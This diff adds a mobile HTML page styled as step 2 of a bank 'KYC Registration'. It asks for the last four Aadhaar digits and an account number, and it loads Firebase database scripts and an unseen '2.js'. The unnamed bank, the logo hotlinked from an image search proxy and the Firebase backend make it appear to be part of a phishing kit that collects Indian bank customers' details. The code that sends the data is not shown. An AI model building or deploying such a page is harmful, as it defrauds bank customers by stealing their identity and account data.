@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>KYC Step 2</title>
+  <style>
+    :root {
+      --primary-color: #003399;
+      --accent-color: #0066cc;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #e6f0ff;
+      margin: 0;
+      padding: 0;
+      font-size: 16px;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 20px auto;
+      padding: 5px;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 10px;
+    }
+
+    .logo img {
+      width: 100%;
+      max-width: 100%;
+      height: auto;
+      border-radius: 12px;
+      object-fit: contain;
+    }
+
+    h2 {
+      color: var(--primary-color);
+      text-align: center;
+      margin: 10px 0 15px 0;
+      font-size: 20px;
+    }
+
+    .form-card {
+      background-color: #ffffff;
+      padding: 15px;
+      border-radius: 10px;
+      box-shadow: 0 3px 8px rgba(0, 0, 0, 0.12);
+    }
+
+    .step {
+      color: var(--primary-color);
+      font-weight: bold;
+      margin-bottom: 12px;
+      font-size: 15px;
+    }
+
+    label {
+      font-weight: 600;
+      display: block;
+      margin-bottom: 5px;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+
+    input[type="text"],
+    input[type="number"] {
+      width: 100%;
+      padding: 10px;
+      font-size: 14px;
+      margin-bottom: 6px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    .hint {
+      font-size: 12px;
+      color: #555;
+      margin-bottom: 12px;
+    }
+
+    .button {
+      margin-top: 16px;
+      text-align: center;
+    }
+
+    button {
+      background-color: var(--primary-color);
+      color: white;
+      padding: 10px 24px;
+      font-size: 15px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #002277;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Logo -->
+    <div class="logo">
+      <img src="https://imgs.search.brave.com/UVJaknhSmsKpOPTt-6yCrvq5M3ZJnwVhHr6zsGUrenI/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9hc3Nl/dHMuc3RpY2twbmcu/Y29tL2ltYWdlcy82/MjdjYzVjOTFiMmUy/NjNiNDU2OTZhOGUu/cG5n" alt="Bank Logo">
+    </div>
+
+    <h2>KYC Registration</h2>
+
+    <div class="form-card">
+      <p class="step">STEP 2 of STEP 2</p>
+
+      <form id="step2Form">
+        <label for="aadhaar">Last 4 digits of Aadhaar</label>
+        <input type="text" id="aadhaar" placeholder="XXXX"
+               required minlength="4" maxlength="4"
+               pattern="\d{4}" inputmode="numeric" />
+        <p class="hint">Enter only last 4 digits of your Aadhaar number</p>
+
+        <label for="account">Account Number</label>
+        <input type="text" id="account" placeholder="Enter Your Account Number" required />
+
+        <div class="button">
+          <button type="submit">Submit</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+  <!-- External Scripts -->
+  <script src="firebase-config.js"></script>
+  <script src="2.js"></script>
+</body>
+</html>
